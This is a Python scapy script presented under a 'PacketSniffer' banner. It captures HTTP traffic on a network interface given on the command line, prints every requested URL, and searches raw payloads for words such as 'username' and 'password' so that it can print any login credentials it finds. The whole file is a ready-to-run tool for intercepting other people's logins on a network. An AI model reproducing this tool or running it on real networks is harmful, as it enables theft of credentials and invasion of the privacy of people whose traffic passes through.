import scapy.all as scapy
from scapy.layers import http
import optparse

print("""
      
██████╗░░█████╗░░█████╗░██╗░░██╗███████╗████████╗░██████╗███╗░░██╗██╗███████╗███████╗███████╗██████╗░
██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██╔════╝╚══██╔══╝██╔════╝████╗░██║██║██╔════╝██╔════╝██╔════╝██╔══██╗
██████╔╝███████║██║░░╚═╝█████═╝░█████╗░░░░░██║░░░╚█████╗░██╔██╗██║██║█████╗░░█████╗░░█████╗░░██████╔╝
██╔═══╝░██╔══██║██║░░██╗██╔═██╗░██╔══╝░░░░░██║░░░░╚═══██╗██║╚████║██║██╔══╝░░██╔══╝░░██╔══╝░░██╔══██╗
██║░░░░░██║░░██║╚█████╔╝██║░╚██╗███████╗░░░██║░░░██████╔╝██║░╚███║██║██║░░░░░██║░░░░░███████╗██║░░██║
╚═╝░░░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚═════╝░╚═╝░░╚══╝╚═╝╚═╝░░░░░╚═╝░░░░░╚══════╝╚═╝░░╚═╝
      """)

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Target interface to be sniffed")
    (options, arguments) = parser.parse_args()
    if not options.interface: 
        parser.error("[-] Please specify an interface, use --help for more info.")
    return options

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode('utf-8', 'ignore')
        keywords = ['username', 'password', 'login', 'user', 'pass']
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    try:
        if packet.haslayer(http.HTTPRequest):
            url = get_url(packet)
            print(f'[+] URL: {url}')

            login_info = get_login_info(packet)
            if login_info:
                print(f'\n\n[+]Possible username/password found: {login_info}\n\n')

            
 

    except Exception as e:
        print(f'[-] ERROR - Exception: {e}')

options = get_arguments()
sniff(options.interface)